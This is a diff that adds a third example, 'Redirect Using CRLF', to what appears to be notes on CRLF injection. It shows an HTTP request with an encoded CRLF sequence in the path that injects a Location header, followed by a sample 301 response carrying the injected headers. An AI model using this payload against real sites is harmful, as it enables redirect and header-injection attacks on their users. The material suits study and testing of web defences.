@@ -56,3 +56,31 @@ Connection: Keep-Alive[CRLF]
 Transfer-Encoding: chunked[CRLF]
 Content-Type: text/html[CRLF][CRLF]
 0
+
+
+
+3) Redirect Using CRLF
+
+Request :
+
+GET /%0d%0aLocation:%20http://www.testwebsite.com HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0[CRLF]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8[CRLF]
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive
+
+Response :
+
+HTTP/1.1 301 Moved Permanently
+Date: Tue, 23 Aug 2011 18:34:36 GMT[CRLF]
+Server: Apache/1.3.33 (Win32) PHP/5.0.2[CRLF]
+X-Powered-By: PHP/5.0.2[CRLF]
+Location:www.testwebsite.com[CRLF]
+New_Header: New_Header_Value
+Keep-Alive: timeout=15, max=99
+Connection: Keep-Alive
+Content-Type: text/html
+
